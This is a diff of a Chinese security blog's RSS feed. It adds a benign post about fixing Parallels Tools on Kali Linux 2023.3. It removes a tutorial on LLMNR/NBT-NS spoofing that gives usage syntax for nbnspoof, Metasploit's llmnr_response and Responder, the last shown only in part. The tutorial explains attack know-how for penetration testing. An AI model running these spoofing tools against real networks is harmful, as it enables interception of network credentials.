@@ -6,10 +6,91 @@
     <description>Recent content on F0rmat&#39;s Blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Fri, 13 Oct 2023 21:04:34 +0800</lastBuildDate>
+    <lastBuildDate>Sat, 14 Oct 2023 01:00:00 +0200</lastBuildDate>
     
         <atom:link href="https://xxe.icu/atom.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>Kali Linux 2023.3安装Parallels Tools</title>
+      <link>https://xxe.icu/install-parallels-tools-on-kali-linux-2023.3.html</link>
+      <pubDate>Sat, 14 Oct 2023 01:00:00 +0200</pubDate>
+      
+      <guid>https://xxe.icu/install-parallels-tools-on-kali-linux-2023.3.html</guid>
+      
+        <description>&lt;h1 id=&#34;0x00-前言&#34;&gt;0x00 前言&lt;/h1&gt;
+&lt;p&gt;一年一度的Parallels Tools适配Kali Linux的问题又来了，这次也是因为内核更新然后pd没跟上导致的。&lt;/p&gt;
+&lt;p&gt;不过论坛也给出了解决的方案，按照文章当中也遇到了一些问题，遂写一篇解决问题的过程文章。&lt;/p&gt;
+&lt;h1 id=&#34;0x01-解决问题&#34;&gt;0x01 解决问题&lt;/h1&gt;
+&lt;h2 id=&#34;1环境&#34;&gt;1、环境&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;macOS Monterey 13.6（intel）&lt;/li&gt;
+&lt;li&gt;Parallels Desktop 19&lt;/li&gt;
+&lt;li&gt;Kali Linux 2023.3 (linux-headers-6.5)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;2解决过程&#34;&gt;2、解决过程&lt;/h2&gt;
+&lt;p&gt;更新源：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get update
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;挂载parallels tools并移动到桌面：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cp -R /media/cdrom0/ ~/Desktop/pdtools/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;安装&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./install
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个时候就开始出错了，因为之前报错的log:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231014171247577.png&#34; alt=&#34;image-20231014171247577&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;如果已经更新了6.5的版本可以重启到启动解决，选择高级-&amp;gt;选择6.3的版本进行启动然后按照下面的步骤进行。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;按照文章当中步骤不太一样，因为我环境是intel，所以要改一下&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://forum.parallels.com/threads/kali-linux-upgrade-boot-kernel-panic.361436/&#34;&gt;https://forum.parallels.com/threads/kali-linux-upgrade-boot-kernel-panic.361436/&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt remove linux-headers-6.5.0-kali2-amd64 linux-image-6.5.0-kali2-amd64 linux-headers-6.5.0-kali2-common linux-kbuild-6.5.0-kali2
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;但是呢，我是找不到文章步骤当中的文件路径，这个我是安装成功才看到的：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/var/lib/dkms/parallels-tools/19.0.0.54570/source
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我就用之前的方法，把pdtools的文件复制出来：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cp -R /media/cdrom0/ ~/Desktop/pdtools/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;解压kmods里面的压缩包,并删除之前的压缩包:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar -xzf prl_mod.tar.gz
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rm prl_mod.tar.gz
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后按照文章给出的补丁进行修复：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;patch -p1 parallels-tools_kernel_6_5_0.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;-p1 是表示忽略第一层目录&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;但是执行会停留在那里不动，可以使用以下的命令进行：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;patch -p1 &amp;lt; parallels-tools_kernel_6_5_0.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后重新打包：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar -zcvf prl_mod.tar.gz . dkms.conf Makefile.kmods
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;下面是6.3.0内核的安装方法&lt;/p&gt;
+&lt;p&gt;我们直接执行&lt;code&gt;./install&lt;/code&gt; 一般会出现系统缺少了&lt;code&gt;dkms&lt;/code&gt;和&lt;code&gt;linux-header&lt;/code&gt;，可以使用下面的命令进行安装：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt install dkms
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;但安装头文件的时候就出问题了，我们可以直接去找软件包进行安装：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;http://old.kali.org/kali/pool/main/l/linux/&#34;&gt;http://old.kali.org/kali/pool/main/l/linux/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;下载以下的文件&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://old.kali.org/kali/pool/main/l/linux/linux-headers-6.3.0-kali1-amd64_6.3.7-1kali1_amd64.deb&#34;&gt;linux-headers-6.3.0-kali1-amd64_6.3.7-1kali1_amd64.deb&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;使用dpkg -i安装就完事了：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dpkg -i linux-headers-6.3.0-kali1-amd64_6.3.7-1kali1_amd64.deb
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;但是过程中也会缺席一些文件，也是从上面的网址下载对应的版本文件，然后dpkg安装，如果出现一些安装错误，可以使用下面的命令修复然后重新dpkg安装：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt install -f
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我一共下载安装了以下一些文件：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;linux-compiler-gcc-12-x86_6.3.7-1kali1_amd64.deb
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;linux-headers-6.3.0-kali1-amd64_6.3.7-1kali1_amd64.deb
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;linux-headers-6.3.0-kali1-common_6.3.7-1kali1_all.deb
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;linux-kbuild-6.3_6.3.7-1kali1_amd64.deb
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后重新执行以安装文件：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./install
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231014172436253.png&#34; alt=&#34;image-20231014172436253&#34;&gt;&lt;/p&gt;
+&lt;p&gt;最后把内核更新到6.5即可：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt update
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt upgrade
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt install linux-headers-6.5.0-kali2-amd64 linux-image-6.5.0-kali2-amd64 linux-headers-6.5.0-kali2-common linux-kbuild-6.5.0-kali2
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;重启就可以正常使用了～&lt;/p&gt;
+&lt;h1 id=&#34;0x02-总结&#34;&gt;0x02 总结&lt;/h1&gt;
+&lt;p&gt;每次安装新版kali都会遇到的问题，不过有了之前的经验，可以举一反三解决问题，要不然按照文章当中始终没能找到那个目录就没办法继续进行下去了。&lt;/p&gt;
+</description>
+      
+    </item>
     
     <item>
       <title>当CVE-2022-35914漏洞遇到disable function</title>
@@ -6317,408 +6398,6 @@ subkey_keymaterial = 65
 &lt;p&gt;&lt;a href=&#34;https://cloud.tencent.com/developer/article/1904077&#34;&gt;https://cloud.tencent.com/developer/article/1904077&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.sec-in.com/article/174&#34;&gt;https://www.sec-in.com/article/174&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/3560&#34;&gt;https://xz.aliyun.com/t/3560&lt;/a&gt;&lt;/p&gt;
-</description>
-      
-    </item>
-    
-    <item>
-      <title>LLMNR/NBT-NS欺骗攻击</title>
-      <link>https://xxe.icu/llmnr_nbt-ns.html</link>
-      <pubDate>Sat, 12 Feb 2022 11:04:34 +0800</pubDate>
-      
-      <guid>https://xxe.icu/llmnr_nbt-ns.html</guid>
-      
-        <description>&lt;h1 id=&#34;0x00-基本概念&#34;&gt;0x00 基本概念&lt;/h1&gt;
-&lt;p&gt;LLMNR＆NBT-NS欺骗攻击可以作为我们内网渗透中的一种手法，主要是利用LLMNR、NetBIOS和WPAD机制进行的中间人攻击获取到NTLMv2凭证或者HTTP认证明文和目标系统的权限，下面我们先来了解一下这几个功能的基本概念。&lt;/p&gt;
-&lt;h2 id=&#34;llmnr&#34;&gt;LLMNR&lt;/h2&gt;
-&lt;p&gt;&lt;strong&gt;链路本地多播名称解析&lt;/strong&gt;( &lt;strong&gt;LLMNR&lt;/strong&gt; ) 是一种基于域名系统数据包格式的协议，它允许IPv4和IPv6主机为同一本地链路上的主机执行名称解析。&lt;/p&gt;
-&lt;h3 id=&#34;包头结构&#34;&gt;包头结构&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;ID - 由生成任何类型查询的程序分配的 16 位标识符。&lt;/li&gt;
-&lt;li&gt;QR - 查询/响应。&lt;/li&gt;
-&lt;li&gt;OPCODE - 一个 4 位字段，指定此消息中的查询类型。此值由查询的发起者设置并复制到响应中。本规范定义了标准查询和响应的行为（操作码值为零）。未来的规范可能会定义其他操作码与 LLMNR 的使用。&lt;/li&gt;
-&lt;li&gt;C - 冲突。&lt;/li&gt;
-&lt;li&gt;TC - 截断。&lt;/li&gt;
-&lt;li&gt;T - 暂定。&lt;/li&gt;
-&lt;li&gt;Z - 保留供将来使用。&lt;/li&gt;
-&lt;li&gt;RCODE - 响应代码。&lt;/li&gt;
-&lt;li&gt;QDCOUNT - 一个无符号 16 位整数，指定问题部分中的条目数。&lt;/li&gt;
-&lt;li&gt;ANCOUNT - 一个无符号的 16 位整数，指定答案部分中的资源记录数。&lt;/li&gt;
-&lt;li&gt;NSCOUNT - 一个无符号的 16 位整数，指定权限记录部分中名称服务器资源记录的数量。&lt;/li&gt;
-&lt;li&gt;ARCOUNT - 一个无符号 16 位整数，指定附加记录部分中的资源记录数。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;netbios&#34;&gt;NetBIOS&lt;/h2&gt;
-&lt;p&gt;&lt;strong&gt;NetBIOS&lt;/strong&gt; 是&lt;strong&gt;Network Basic Input/Output System&lt;/strong&gt;的首字母缩写词。它提供与OSI 模型的会话层相关的服务，允许不同计算机上的应用程序通过局域网进行通信。作为严格的API，NetBIOS 不是网络协议。NetBIOS 也用于识别 TCP/IP(Windows) 中的系统名称。简单地说，它是一种允许在局域网中通过 OSI 模型的会话层进行文件和打印机通信的协议。&lt;/p&gt;
-&lt;h3 id=&#34;服务&#34;&gt;服务&lt;/h3&gt;
-&lt;p&gt;NetBIOS 提供三种不同的服务：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;用于名称注册和解析的名称服务 (NetBIOS-NS) 。&lt;/li&gt;
-&lt;li&gt;用于无连接通信的数据报分发服务 (NetBIOS-DGM)。&lt;/li&gt;
-&lt;li&gt;面向连接通信的会话服务 (NetBIOS-SSN) 。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;blockquote&gt;
-&lt;p&gt;SMB是上层，是运行在 Session Service 和 Datagram 服务之上的服务，不要混淆为 NetBIOS 本身的必要组成部分。现在它可以运行在 TCP 之上，只需要一个小为每个 SMB 消息添加数据包长度的适配层；这是必要的，因为 TCP 仅提供字节流服务，没有数据包边界的概念。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h3 id=&#34;名称服务&#34;&gt;名称服务&lt;/h3&gt;
-&lt;p&gt;为了启动会话或分发数据报，应用程序必须使用名称服务注册其 NetBIOS 名称。NetBIOS 名称的长度为 16 个八位字节，并且根据特定的实现而有所不同。通常，称为 NetBIOS 后缀的第 16 个八位字节指定资源的类型，并可用于告诉其他应用程序系统提供的服务类型。在NBT中，名称服务在 UDP 端口 137 上运行（也可以使用 TCP 端口 137，但很少使用）。&lt;/p&gt;
-&lt;p&gt;NetBIOS 提供的名称服务原语是：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;添加名称——注册一个 NetBIOS 名称。&lt;/li&gt;
-&lt;li&gt;添加组名——注册一个 NetBIOS“组”名。&lt;/li&gt;
-&lt;li&gt;删除名称 - 取消注册 NetBIOS 名称或组名称。&lt;/li&gt;
-&lt;li&gt;查找名称 - 在网络上查找 NetBIOS 名称。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;Microsoft 不支持&lt;a href=&#34;https://en.wikipedia.org/wiki/IPv6&#34;&gt;Internet 协议版本 6 (IPv6)&lt;/a&gt;的 NetBIOS 名称解析。&lt;/p&gt;
-&lt;h3 id=&#34;节点类型&#34;&gt;节点类型&lt;/h3&gt;
-&lt;p&gt;在 Windows 下，联网计算机的&lt;strong&gt;节点类型&lt;/strong&gt;与其将 NetBIOS 名称解析为IP 地址的方式有关。这假定 NetBIOS 节点有任何 IP 地址，只有当 NetBIOS 在 NBT 上运行时才能保证；因此，节点类型不是 NetBIOS 本身的属性，而是 Windows OS 环境中 NetBIOS 和 TCP/IP 之间交互的属性。有四种节点类型。&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;B节点：0x01广播&lt;/li&gt;
-&lt;li&gt;P 节点：0x02 对等点（仅限 WINS）&lt;/li&gt;
-&lt;li&gt;M节点：0x04混合（广播，然后WINS）&lt;/li&gt;
-&lt;li&gt;H节点：0x08 Hybrid（WINS，然后广播）&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;wpad&#34;&gt;WPAD&lt;/h2&gt;
-&lt;p&gt;&lt;strong&gt;Web 代理自动发现 (WPAD) 协议&lt;/strong&gt;是组织允许员工通过代理服务器访问互联网，以提高性能、确保安全和跟踪流量。连接到公司网络的用户需要知道特定 URL 的代理服务器，客户端使用 DHCP 和/或 DNS 发现方法来定位配置文件的 URL 的一种方法。 一旦配置文件的检测和下载完成，就可以执行它来确定指定 URL 的代理。在IE在网络设置打勾就表示启用了wpad，默认是不开启的，但是在 Windows 10 中WPAD 默认是启用的：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
-&lt;h1 id=&#34;0x01-工作原理&#34;&gt;0x01 工作原理&lt;/h1&gt;
-&lt;p&gt;我们要明白LLNBR(UDP/5355)和NetBIOS(UDP/137) 两者的区别，其实这两个都是用于名称解析的，NetBIOS是从Windows 2000开始启用的，LLNNR是作为windows Vista以上的系统开始启用的协议，还有就是NetBIOS是Windows进行通信的API，LLMNR是网络协议，但是两者主要功能是一样的。在系统进行名称解析会进行以下的步骤：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;检查以确认请求是否针对本地计算机名称。&lt;/li&gt;
-&lt;li&gt;检查最近成功解析的名称的本地缓存。&lt;/li&gt;
-&lt;li&gt;搜索本地hosts文件当中解析。&lt;/li&gt;
-&lt;li&gt;查询 DNS 服务器。&lt;/li&gt;
-&lt;li&gt;如果启用了 LLMNR，则在本地子网中广播 LLMNR 查询以请求其对等方进行解析。&lt;/li&gt;
-&lt;li&gt;如果启用了 NetBIOS，如果名称不在本地 NetBIOS 缓存中，则尝试通过向本地子网广播 NetBIOS-NS 查询来解析 NetBIOS 名称。如果这样配置，此步骤可能会使用 Windows Internet 名称服务 (WINS) 服务器以及 LAN 管理器主机 (LMHOSTS) 文件。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;也就是说当我们在使用名称查找主机的时候(使用win+R，输入\\errorhost)，会执行上面的步骤，所以总的来说只有当我们输入计算机和DNS服务器不存在的主机名称的时候才会触发LLMNR和NetBIOS，笔者感觉这个漏洞还是有局限性的，所以在内网渗透中用的不是很多。&lt;/p&gt;
-&lt;h1 id=&#34;0x02-攻击工具&#34;&gt;0x02 攻击工具&lt;/h1&gt;
-&lt;h2 id=&#34;nbnspoof---netbios-name-service-spoofer&#34;&gt;NBNSpoof - NetBIOS Name Service Spoofer&lt;/h2&gt;
-&lt;p&gt;NBNSpoof 是一种用于自动制作对 NetBIOS 名称服务 (NBNS) 名称查询的响应的工具。当 Windows 机器无法通过 DNS 和 WINS 解析域名时，它们将发送广播 NBNS 查询以查看有问题的名称是否与本地网络上的任何计算机名称匹配。在受害者错误键入域名或 DNS 服务器无法访问的情况下，对这些请求做出响应对攻击者特别有用。&lt;/p&gt;
-&lt;p&gt;下载地址：&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://github.com/nomex/nbnspoof&#34;&gt;https://github.com/nomex/nbnspoof&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;使用方法：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nbnspoof.py [-v] -i &amp;lt;interface&amp;gt; -n &amp;lt;regexp&amp;gt; -h &amp;lt;ip address&amp;gt; -m &amp;lt;MAC&amp;gt; [-p &amp;lt;ip address&amp;gt;]
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-v Verbose output of sniffed NBNS name queries, and responses sent
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-i The interface you want to sniff and send on
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-n A regular expression applied to each query to determine whether a
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   spoofed response will be sent
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-h The IP address that will be sent in spoofed responses
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-p (optional) The IP address of the victim (if unset, pwn all)
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-m The source MAC address for spoofed responses
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;llmnr_response&#34;&gt;llmnr_response&lt;/h2&gt;
-&lt;p&gt;这是一款在msf中使用的工具。利用方法如下：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf &amp;gt; use auxiliary/spoof/llmnr/llmnr_response
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf auxiliary(llmnr_response) &amp;gt; show actions
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ...actions...
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf auxiliary(llmnr_response) &amp;gt; set ACTION &amp;lt; action-name &amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf auxiliary(llmnr_response) &amp;gt; show options
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ...show and set options...
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf auxiliary(llmnr_response) &amp;gt; run
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;responder&#34;&gt;Responder&lt;/h2&gt;
-&lt;p&gt;Responder是一款很强大的中间人利用工具，也是本文中实践使用的工具，主要的功能有双 IPv6/IPv4 堆栈、内置 SMB 身份验证服务器、内置 MSSQL 身份验证服务器、内置 HTTP 身份验证服务器、内置 HTTPS 身份验证服务器、内置 LDAP 身份验证服务器、内置 DCE-RPC 身份验证服务器、内置 FTP、POP3、IMAP、SMTP Auth 服务器、内置DNS服务器、内置 WPAD 代理服务器、浏览器监听器、指纹识别、Icmp 重定向、DHCP欺骗、分析模式。&lt;/p&gt;
-&lt;p&gt;下载地址：&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://github.com/lgandx/Responder&#34;&gt;https://github.com/lgandx/Responder&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;使用方法：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--version             show program&amp;#39;s version number and exit
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-h, --help            show this help message and exit
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-A, --analyze         Analyze mode. This option allows you to see NBT-NS,
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    BROWSER, LLMNR requests without responding.
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-I eth0, --interface=eth0
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    Network interface to use, you can use &amp;#39;ALL&amp;#39; as a
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    wildcard for all interfaces
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-i 10.0.0.21, --ip=10.0.0.21
